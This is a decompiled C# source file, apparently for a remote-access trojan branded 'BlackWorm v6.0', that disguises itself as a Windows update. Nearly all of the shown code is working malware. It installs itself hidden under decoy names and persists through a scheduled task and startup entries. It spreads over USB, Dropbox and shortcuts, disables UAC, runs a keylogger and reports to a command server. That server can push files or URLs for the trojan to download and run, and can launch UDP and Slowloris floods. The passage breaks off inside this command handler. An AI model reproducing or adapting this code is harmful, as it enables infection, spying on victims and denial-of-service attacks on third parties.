using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using WindowsUpdate.My;

namespace WindowsUpdate;

[StandardModule]
public sealed class A
{
	public delegate void InvokeDelegate();

	public static string h = "zJFFRe3pOtb9WJVCCs1jowjSuYnJ0HyfC3HM9Ceo22UNqAWMOQzYLrzzCRoL+GEHia2qcJhfzq3WNCBitiucOeJy/39mNqtkLD0GMkpcZr/1gninxMex+QwqciutjanIW6EJrSOrnssjLks8+UJRVHRGNH8fBwNuJWvFEcoQaNQztIqEkeOJcep8V+BEQD6qq9LFUcnlsjcUNj+W6nbzpkltSyt9L+koGAQWu5phuqa5uJhuzIaDkcFjSc8HHOkmcinugDOPDiZb10o7HXe5vY5rpY/7H5E5EhefTZ2M+R1AbkcpLgE0oz7EPaYAvyd0aD+mdyAtiP0lpoTMJrpj5j9mlNOBD9PiHH6hDmoSg4sABNG4FAVdKsz65vJmOGl6b2x47Kqbslv4Mzb20xGOrLNu7Un5eSqK5GAovOwUeugXksvKRS5zxKiUnjgadoEYl5X/MiWgdCeAxmu1JDVY9xZMFrIkl0zguoEIJ4K0Wos31J82WuzSQCh/ZlxL4DADq2MyGcW7joo6pMfr0IdxBhoEKZC6PbDYubrk6GeF+eDWll87J0r8Sp2alIhR4kXlT/hW61VubcqpVn3CBolS0al9xSCMZGfT6ujFMSL1HewLcSBKJ7K8uDZJ2q/tfHpe0lS+A5/qFtypMu8KsAC3qoWf+oJFrMBIsDRf5rPRIBk=";

	public static string p = "rqryhUssgm51pJX3yeIeUdawGLy0DmgYcELlGJjQV3u6D/Hj1QBIXEl0Tt8/6jHC2cLq785fX+jt+kwRaZMXQw5JtP9qR0LLt42zINXBDtqQwlVC/QuyYcQcEiIX9dv4ywvNAoir+b92pXmW8HK967sqfEXQQ9JDr5mF1kW0D7DKjgdg6uFq8gH3pkKI1Znh7Pp9GeUcaONIvqKDDsWUfqd3cOBhhvP+lQNRHEDEBF5WEd4j/lVd1C1dq8sW5WD3BIehrKWPASHYBnUGK4c0o/u7Tl8oeda9eFZ2h0cjZgR94x6QqWqO2mzZ/gmTe715Du6TPyRajv/9f0io0FvFKU9vKqG+mKbsKHWpVK4StTgnpiz/RmuxNT0ti4gHgEFQt3fF2xMfjZ1GHXrIfhRO2C/pJU+DpV4KJPftF6zJTAqYyEarm+LQtQ2yw/F9OC8BDqrG/uGRO68/8E3qA9rdlQVDBoQ7mfGK1qyZ0AZ8KrOPT3/OvkhfNy+f6rZakiI11gPGh8XTBD9skXBpTAo8vEfL+MRhsA+hLXk6Xz63qDTv2B4HkZ5vtnZLb5L1B9Xe6BGN7hVGhrPV2iosw39tjz4yZyR99TROjR8TRnjK87qpdELeAiCUuZdRR8TF+P7FJt4AXnfMLITLpMLTLBgWVj8mysnEv0ySmRKpoExS9lk=";

	public static string dwport = "NjA2MA==";

	public static string Name = "HacKed";

	public static string Y = "|BlackWorm|";

	public static string Ver = "v6.0 [ Black Ninja ]";

	public static string ulink = "True";

	public static string startUP = "40f1abfeb160a5f5393e777877aaa6e4";

	public static string addstart = "True";

	public static string exen = "USB.exe";

	public static string taskmanager = "True";

	public static string AntiVM = "False";

	public static string EncryptStatus = "True";

	public static string EncryptKey = "PFJTQUtleVZhbHVlPjxNb2R1bHVzPjRMQlRjakROdVZFTkdSeEJpTTFQTkZhZjg4bkJTS2RMc0xhdW5rTWorYmFJeVVCTXRISDFmSFJxTWpybTNTbG13ajYxK3Zxc3d3VHhPeEJ1QmVYamo1QXgweFI2bW5JdS9xTzNuNGJPbHFSRmQvWEZ2SHFrUVN1azdabVBnSU10ZmpLalBWWXNpa09DZWkrZnliU3ZVcFppZjVRUlk5TkFwRjYzNHpuTnV3REZKNFU1clNDbzNpeXpOY0NscHhoZC9JU0JuUGV0UW44aVUveDFES0tzekwyVGViUkZwMm9yblBFSS9rc1F4aFB1aXRHSlJ0QlprMTgvR3ZoV1Y0U2kzQWdlajdPVGg5cWJwTXIrWjRaa3IzcERlc3NpYlk2dm9mb1d1ZExjL1dSQktuTCtYdEViWVJqMTRTU1NsNnBjeEp3aC9ldU5SMElUc1lGMzFlSXBicUQ2YlpvN3pJbFNaUmg3ZnVFeUhKdlJ0cW15Zkc0Vmx4QTZacU5iVzc0cmpDNnZXSzZydVJSZzB2Rm0vU1Ntc0ZqUzJJc2V5YXFyK3NDOEZDSXpzcXVCVURDUCt3ZkFqU3dFVnBKYm84WG5aOE9DMXBsSmdsRHl0eDEweW1LS3J1NWtaT0h4WWdTNXV6ZEU4WUZBUFNmUnFZSXlEay82Nlg4bHlWZFpVdXVLa1J3SllLV3hGWVVjcmgrcytBT2YzRFpWUVV6WFVnbkVCcVVpcnRtQWRFRDc1ZWdrd1g4ZG9FRzJEYmZVcUZRQkpWTEliQVJwZW50WWJUeHRLRzE3UkVHMHpEZCszczR2dkhrdGd4M1dlNDJkOTRXTmM0Q2p3SEUxTzM3Z1lEaURDNVp4UnpxN1pocEpSdCtEcEY2d2dPSlNWdEVlczNtUmRjUGp2emNkOEo4PTwvTW9kdWx1cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PFA+L1pxNVprcGdIZVVaUjY5dWFHZ0plTXM5ZnpEb01sYjNuN0ZudEpGTWo4RGgzNHVSNmZYeVo4d2lQa0ZIR3pYeXZGMVI3QVRMazNSQTA2NkZJb3dOeEF5cklpYmRGWHM4NFV0K2h6T2tVUmZrcXkxcnp2clJpUGM3Y25QTDVXV1hwNzNTT3FIeXVldW5KRklxSzYyWUJJd0xwSVd2VFBqN29Db3U2dDlxODJjTzQwSTRRdWtmTXdVSCtWclE2TlZzaUI1TkEzUE9lQnQ4KzBFVUV6Tlo5RzVqaERoK3A1YitrbnJPRUxFSlNKN3hFTVh2ajVnMFJXOW5UbU9QK0N2aHBNOTl1OFl0MmFxWXQrQ21jRWRFNHpVc2VnUXAzUzNrZVpSbFhudzgvVnNhd0txUUtoczdrRi9oK1BPSEdhbHVCTFFxTlMvK2FWNHRtYVJvYlVncmdRPT08L1A+PFE+NHMrdFNSbENQMTkrYlYvUGR0aEZoWm0zdEVscDNJNzJwVi8ybFo2QU0wQys2RDF5Y1JnUWloZzAxNldhYlZTT3M0K2VVTy80VUY1L1JqbVJWM0NQRktHbldLN1YzMVZ0aEtWbXczZExyYWpybFNTMk5INk9wTmloeTBTdkIrajdWSXU1MVF6cVBtb0V4OEZPQ0tmMEdLdERIVDNXUnNOaUdVcWIzUk5zWlQrbWtBaHVtTVNzSlIxTm5LeENJQjBabEtvYTJMQ3IzSlk4WjhXRGwvUFpBRm51am1qTmxRMUtmaXFGZHlOWGF0djdjQnhpQ3hiMEF1aEk2OXNpVVFsNDNNQkRxQ0I0OVl5Zmk3ZC9HU2w5RkZqbitkZkFtdEhjaXhoYmMvanYrckdBZHVFOEFQRGk2bXpKci91aWxCSDBSZk84K1JMbW1QdXV1WDB2aVNhc0h3PT08L1E+PERQPnFMUmQ4MU0wMzQ1QkkvUHJJWjliOWJSV1E1OTRSOHljeStvTFVBNThmUURXQVl6cVUxWmVuSGdxcTNsbllRMmhYWGREQVJ3cmhQc0lDUW1HM1hXSHpzeVNwNVJzN0ZaZ0tJdTlMeG5HakgrMWliNGNnc05OMHF5TktsVW41WUdRd25DL1FtdnJlWXp2VW5VcVFvWW5vNWE2UkFiK2w5am1JeVVNc3doUE1INTFZKzd3V0dxV2E2MUVJYmd0VTBadS9ab1NwMkpKanBMU3NKNFpTYkNXZmNsVmdHYklzcG42M2R5OTZsS3JGMWxNaWxqeVJYYitCdGJXUlVwc1FxNkdXOG9BSFlMM2kxNDJXOVFoUkgzVXNNVDF3bkcwbThOa3d4Qlo0dUlJL0kyM25VV1p3N2o4QmM0VEdEYUF3Q3g2Mkx3MWU4NWlreHVvZ0JYanRoY1ZnUT09PC9EUD48RFE+Yk0rM1VaZGxtZU9sVXJHaFpXR3lVTHNEVCtIY2dLeXhsWHNwWUhSUENzZW9EdURUMDMvNUIxYy9tcWxmSWM1c082Yk9EQVJrTzZKcUt2V1pUYnE1V2V1SHpscnFUaCs4eitOT0hyNVB0enVQOGRoUDlYVTExODM2S1B1RmdTVDcxbjdHSTNqenRBZkd6Vkptcm01dEE1eStNUHdtbllKRXdOOXpVU2R0WEZHaUJmMlZtWUxaRjJFc2g5cDRTdEhMSVBCT3V1QmZRdzlzWVZoM25tR2xISzhJYkpmSThSWVVROTBBZEx5bXhxUk14MmRHZmcxLytSa1pTdFd4YS9GQVk1OTFsZVltUVo4Nk41eEx4SFdNQlVQMTNuM3NjQm40VlY3VkdSazNnQ3pCOWNadXRBRGN6Qnh1MGhmRjBvV2VqQ1MzNTBKekVMZkdCa1VSbGhuUWZ3PT08L0RRPjxJbnZlcnNlUT5uT251MTVDb0lKeGVNRW14a05EbW1QUXF3VEh6QUhkK1ZQb2o4V1BodnlZSFF1OXdyYVFXSjVEKzQwTDRLUHVxS1JFRFJRY3dBVmF4aHFhMGVIZy9XcDRFU2lUamZhU29TdlVxd0dtMGEyTlZMVXlERWNHOWFBRTFiS1BVSWZUWUo3Wm1SdGxyb3dGOFVLc3dEUnlvSjVkOU5ST2ZKWHdVTUFreE9NMGVJRXRpaVg2Q05sWmZJdjQxajlJM1RHKzhaeGxlRGxWRitZQWpqV2tqazNkcGRFdDRUeW5xU1VGZXhoemVMcGtTbXZXRFl1aklRVkpUa0VGWE5CV0JGbEw1bWFSTEd0WWNkQmVLRklDdkNlNzBsdmtTZXFXY3huTWRzdUJvdys4LzZzOGRRYVJBRHArclpGZlJuRmpuYWZIZm9uREFiTHhUYjNVc3VhWU1wdkJwTVE9PTwvSW52ZXJzZVE+PEQ+aEdPQWwzem9DblFXU3FCYWdOZXYvbiszK1hYOE8rbk84RTJEYjk3Um1MWVR2TGoxT1RFWVd2OWcvejJ6ZjhhQU5KMnNyamY3aVdFbEhnOGROTDV5cWNsbGdpREQ2TEswdS9jTkg2TFhvTzBqdlg0RHgzMWZ3TUtOaUMzOTN0UHIvenFvOG1BUEdGeVV5WmU4QjZZOTAyU21udE5JdDgvbWU3TVBtSVFia3o3dDY4NVU0SXlvMDFmMU5BdlJ6elhOVXhka0kyL1FGNmsvT2NzNzBIa2RaZm1ocG9rd3JXY2lVWE80UDlWTkNkaitxYTZ5dXhYU1ljSXlOWnJ6ak5lcStnaVNzVXMyOTBvNGdRM1dmbnN5WWk2aENmNGN4LzdWdjVQU3hpVFhiem9lSjN2Z0kxQUVXTjdUS1poYUE2RXV6ZTNOSFljb0ZEOTd5UkFtNHRCQ1prREQzRCtOcExPV1lsbGRsS1FuckdaQWlYRTF3TW1iRkZLNFY2SHF4M0Y0RHFydnRlb2F1QkZ6MWFyTXZmZnFwejAxRWY3VVJka1hiN2FTbkJmOGRSQm1uM1R2VUw1UHVBZkx0dWh0MWsvV2psbVBYaWdUbmJta05FbmU4OVo0MTJKOHJScWVkVFNLMUhRU3I0MUJqNVZXdzNnMDZMNDZBRE00aVpWRzVqTHpyUjZ0V2wwTU9TMXRTTE82R3NRVlUvRDBDNzZhc2Z5UHp4UFA1MXk0M0grZ3VFK0xDSkZsVzVtZWFJWVY5QjVDVjhKZFdWekltdHhRYUEyY0FLSjR5elVhM2xrMGpISGdUazRnTnlaVUZkaTBmYStVTXREemlIR1RyT3hnc2E4ZTJqRWY5N1dUS3Bsdld5ajZyWndNb2J6dGdKK3Q4ZVpPelVzaUt1eXkvd0U9PC9EPjwvUlNBS2V5VmFsdWU+";

	public static string BypassS = "False";

	public static string DownloaderStatus = "False";

	public static string DownloadURL = "";

	public static string DownloadPath = "";

	public static string DownloadName = "";

	public static string DownloadSleep = "";

	public static string BinderStatus = "False";

	public static string BinderString = "";

	public static string BinderPath = "";

	public static string BinderSleep = "";

	public static string BinderName = "";

	public static string WatcherStatus = "False";

	public static string WatcherString = "";

	public static string Password = "Q19CbGFja1dvcm0=";

	public static string spread;

	public static string check = checkadmin();

	public static string UAC = "False";

	public static string BitcoinAddress;

	public static string MTX = "Yldvcm1bVDlUQU01LTc5ODI4XQ==";

	public static string DropBoxSpread = "True";

	public static string SchTaskEnable = "True";

	public static Mutex MT = null;

	public static string ransompassword;

	public static string ShortCut = "True";

	public static string PathS = "Temp";

	public static string HardInstall = "False";

	public static string InstallName = "Micosoft.exe";

	public static string crtical = "False";

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static object LO = new FileInfo(Application.get_ExecutablePath());

	public static Computer F = new Computer();

	public static TCP C = new TCP();

	public static string s = new FileInfo(Application.get_ExecutablePath()).get_Name();

	public static FileInfo EXE = new FileInfo(Application.get_ExecutablePath());

	public static int st = 0;

	public static Thread trd;

	public static WatcherSettings Watcher = new WatcherSettings();

	public static kl kl = new kl();

	private static CRDP cap;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	public static string strin = null;

	private static object Pro;

	private static object Pro1;

	private static UDP UDPAttack = new UDP();

	public static Process[] GetProcesses;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long BlockInput(long fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszReturnString, long cchReturnLength, long hwndCallback);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_037e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0388: Expected O, but got Unknown
		if ((Operators.CompareString(MySettingsProperty.Settings.Group, "", false) == 0) | (Operators.CompareString(MySettingsProperty.Settings.Group, "None", false) == 0))
		{
			MySettingsProperty.Settings.Group = "None";
			((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
		}
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (CompDir(new FileInfo(process.MainModule!.FileName), (FileInfo)LO) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(DEB(ref MTX));
			ProjectData.EndApp();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			MT = new Mutex(initiallyOwned: true, DEB(ref MTX));
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(HardInstall, "True", false) == 0)
		{
			Install_Server();
			if (Operators.CompareString(Application.get_ExecutablePath(), Interaction.Environ(PathS) + "\\Microsoft\\MyClient\\" + InstallName, false) != 0)
			{
				Process.Start(Interaction.Environ(PathS) + "\\Microsoft\\MyClient\\" + InstallName);
				Application.Exit();
				try
				{
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				ProjectData.EndApp();
			}
		}
		if ((Operators.CompareString(MySettingsProperty.Settings.Group, "", false) == 0) | (Operators.CompareString(MySettingsProperty.Settings.Group, "None", false) == 0))
		{
			MySettingsProperty.Settings.Group = "None";
			((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
		}
		UsbVicTim();
		if (Operators.CompareString(SchTaskEnable, "True", false) == 0)
		{
			SchTask();
		}
		if (Operators.CompareString(addstart, "True", false) == 0)
		{
			st = 0;
			trd = new Thread(StartEvrey.StartWork);
			trd.IsBackground = true;
			trd.Start();
		}
		if (Operators.CompareString(DownloaderStatus, "True", false) == 0)
		{
			Downloader downloader = new Downloader();
			downloader.StartDownlaoder(DownloadURL, DownloadPath, DownloadName, DownloadSleep);
		}
		if (Operators.CompareString(BinderStatus, "True", false) == 0)
		{
			Binder binder = new Binder();
			binder.NewBinder(BinderString, BinderPath, BinderSleep, BinderName);
		}
		if (Operators.CompareString(WatcherStatus, "True", false) == 0)
		{
			Watcher.NewWatcher(WatcherString);
		}
		if (Operators.CompareString(DropBoxSpread, "True", false) == 0)
		{
			DropBoxSpreadFunc(exen);
		}
		if (Operators.CompareString(ulink, "True", false) == 0 && Operators.CompareString(spread, "Yes", false) != 0)
		{
			USB uSB = new USB();
			uSB.ExeName = exen;
			uSB.Start();
		}
		if (Operators.CompareString(UAC, "True", false) == 0)
		{
			UACD();
		}
		if (Operators.CompareString(taskmanager, "True", false) == 0)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					ED();
				});
				pr(1);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(AntiVM, "True", false) == 0)
		{
			AntiVM antiVM = new AntiVM();
			antiVM.ST(Application.get_ExecutablePath());
		}
		if (Operators.CompareString(BypassS, "True", false) == 0)
		{
			Screening_Programs.Bypass();
		}
		if (Operators.CompareString(ShortCut, "True", false) == 0)
		{
			ShortcutInstall shortcutInstall = new ShortcutInstall();
			shortcutInstall.ShortcutInfection();
		}
		if (Operators.CompareString(crtical, "True", false) == 0)
		{
			SetProcCritical.CriticalProcess();
		}
		object obj = new Thread(kl.WRK, 1);
		NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		string text = "";
		while (true)
		{
			Thread.Sleep(5000);
			string text2 = ACT();
			if (Operators.CompareString(text2, text, false) != 0)
			{
				text = text2;
				TCP c = C;
				string text3 = "!1";
				c.Send(ENB(ref text3) + Y + ENB(ref text2));
			}
		}
	}

	public static void Transfer(bool Status, string Host, int NewPort, string NewID, string NewPw)
	{
		MySettingsProperty.Settings.NewHost = Host;
		MySettingsProperty.Settings.NewPort = NewPort;
		MySettingsProperty.Settings.TransferStatus = true;
		MySettingsProperty.Settings.ID = NewID;
		MySettingsProperty.Settings.PW = NewPw;
		((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
	}

	public static void UACD()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (Operators.CompareString(registryKey.GetValue("EnableLUA")!.ToString(), "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SchTask()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 137:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_003d;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_003d:
					num = 4;
					Interaction.Shell("schtasks /create /sc minute /mo 1 /tn WindowsUpdate/tr " + text, (AppWinStyle)0, false, -1);
					break;
					IL_0020:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, File.ReadAllBytes(Application.get_ExecutablePath()), true);
					goto IL_003d;
					IL_0009:
					num = 2;
					text = Interaction.Environ(PathS) + "\\Microsoft\\WindowsUpdate.exe";
					goto IL_0020;
					end_IL_0001_2:
					break;
				}
				num = 5;
				Thread.Sleep(10000);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 137;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Install_Server()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (Operators.CompareString(Application.get_ExecutablePath(), Interaction.Environ(PathS) + "\\Microsoft\\MyClient\\" + InstallName, false) == 0)
					{
						goto end_IL_0001;
					}
					goto IL_0031;
				case 356:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001_2;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 4:
							goto IL_0031;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_003b;
						case 8:
							goto IL_005d;
						case 9:
							goto IL_005f;
						case 7:
						case 10:
						case 11:
							goto IL_007c;
						case 12:
							goto IL_0085;
						case 13:
							goto IL_00a9;
						case 14:
							goto IL_00cb;
						case 16:
							goto IL_00ef;
						case 17:
							goto end_IL_0001_3;
						default:
							goto end_IL_0001_2;
						case 2:
						case 3:
						case 15:
						case 18:
						case 19:
						case 20:
							goto end_IL_0001;
						}
						goto default;
					}
					IL_00ef:
					num = 16;
					break;
					IL_00cb:
					num = 14;
					Melt(Interaction.Environ(PathS) + "\\" + text + InstallName);
					goto end_IL_0001;
					IL_0031:
					num = 4;
					goto IL_0033;
					IL_0033:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_003b;
					IL_003b:
					num = 6;
					if (!Directory.Exists(Interaction.Environ(PathS) + "\\Microsoft\\MyClient\\" + InstallName))
					{
						goto IL_005d;
					}
					goto IL_007c;
					IL_005d:
					num = 8;
					goto IL_005f;
					IL_005f:
					num = 9;
					Directory.CreateDirectory(Interaction.Environ(PathS) + "\\Microsoft\\MyClient\\");
					goto IL_007c;
					IL_007c:
					num = 11;
					text = "Microsoft\\MyClient\\";
					goto IL_0085;
					IL_0085:
					num = 12;
					if (File.Exists(Interaction.Environ(PathS) + "\\" + text + InstallName))
					{
						goto IL_00a9;
					}
					goto IL_00ef;
					IL_00a9:
					num = 13;
					File.Delete(Interaction.Environ(PathS) + "\\" + text + InstallName);
					goto IL_00cb;
					end_IL_0001_3:
					break;
				}
				num = 17;
				Melt(Application.get_ExecutablePath());
				break;
				end_IL_0001_2:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 356;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Melt(string filename)
	{
		File.Copy(Application.get_ExecutablePath(), filename, overwrite: true);
		File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
		Exta.AStartup(startUP, filename);
	}

	public static string ENB(ref string s)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		return Convert.ToBase64String(bytes);
	}

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = F1.Directory;
		DirectoryInfo directoryInfo2 = F2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void IND(byte[] b)
	{
		//IL_1837: Unknown result type (might be due to invalid IL or missing references)
		//IL_1855: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fa7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fb5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fe5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ff3: Unknown result type (might be due to invalid IL or missing references)
		//IL_30ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_30f1: Expected O, but got Unknown
		string[] array = Strings.Split(BS(b), Y, -1, (CompareMethod)0);
		string text = DEB(ref array[0]);
		if (Operators.CompareString(text, "ping", false) == 0)
		{
			TCP c = C;
			string text2 = "ping";
			c.Send(ENB(ref text2));
			return;
		}
		if (Operators.CompareString(text, "CloseServer", false) == 0)
		{
			TCP c2 = C;
			string[] array2 = new string[7];
			string[] array3 = array2;
			string text2 = "MSG";
			array3[0] = ENB(ref text2);
			array2[1] = Y;
			array2[2] = "Client Disconncted";
			array2[3] = Y;
			array2[4] = "Succ";
			array2[5] = Y;
			array2[6] = "decode";
			c2.Send(string.Concat(array2));
			Watcher.StopWatcher(DeleteWatcher: true);
			ED();
			pr(0);
			Application.Exit();
			ProjectData.EndApp();
			return;
		}
		if (Operators.CompareString(text, "RestartServer", false) == 0)
		{
			TCP c3 = C;
			string[] array2 = new string[7];
			string[] array4 = array2;
			string text2 = "MSG";
			array4[0] = ENB(ref text2);
			array2[1] = Y;
			array2[2] = "Clinet Restarted";
			array2[3] = Y;
			array2[4] = "Succ";
			array2[5] = Y;
			array2[6] = "decode";
			c3.Send(string.Concat(array2));
			Watcher.StopWatcher(DeleteWatcher: true);
			ED();
			pr(0);
			Application.Restart();
			ProjectData.EndApp();
			return;
		}
		if (Operators.CompareString(text, "sendfile", false) == 0)
		{
			TCP c4 = C;
			string[] array2 = new string[7];
			string[] array5 = array2;
			string text2 = "MSG";
			array5[0] = ENB(ref text2);
			array2[1] = Y;
			array2[2] = "File Uploaded";
			array2[3] = Y;
			array2[4] = "Succ";
			array2[5] = Y;
			array2[6] = "decode";
			c4.Send(string.Concat(array2));
			File.WriteAllBytes(Path.GetTempPath() + DEB(ref array[1]), Convert.FromBase64String(array[2]));
			Thread.Sleep(1000);
			Process.Start(Path.GetTempPath() + DEB(ref array[1]));
			TCP c5 = C;
			array2 = new string[7];
			string[] array6 = array2;
			text2 = "MSG";
			array6[0] = ENB(ref text2);
			array2[1] = Y;
			array2[2] = "File Has Been Uploaded";
			array2[3] = Y;
			array2[4] = "Succ";
			array2[5] = Y;
			array2[6] = "decode";
			c5.Send(string.Concat(array2));
			return;
		}
		checked
		{
			switch (text)
			{
			case "download":
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(DEB(ref array[1]), Path.GetTempPath() + DEB(ref array[2]));
				Thread.Sleep(1000);
				Process.Start(Path.GetTempPath() + DEB(ref array[2]));
				TCP c51 = C;
				string[] array2 = new string[7];
				string[] array34 = array2;
				string text2 = "MSG";
				array34[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "File Uploaded From URL";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c51.Send(string.Concat(array2));
				break;
			}
			case "UDPStart":
			{
				TCP c56 = C;
				string[] array2 = new string[7];
				string[] array40 = array2;
				string text2 = "MSG";
				array40[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "UDP Attack Started";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c56.Send(string.Concat(array2));
				UDPAttack.Host = DEB(ref array[1]);
				UDPAttack.Start();
				break;
			}
			case "UDPStop":
			{
				UDPAttack.Abort();
				TCP c46 = C;
				string[] array2 = new string[7];
				string[] array30 = array2;
				string text2 = "MSG";
				array30[0] = ENB(ref text2);
				array2[1] = Y;
				array2[2] = "UDP Attack Stopped";
				array2[3] = Y;
				array2[4] = "Succ";
				array2[5] = Y;
				array2[6] = "decode";
				c46.Send(string.Concat(array2));
				break;
			}
			case "startSlowloris":
			{
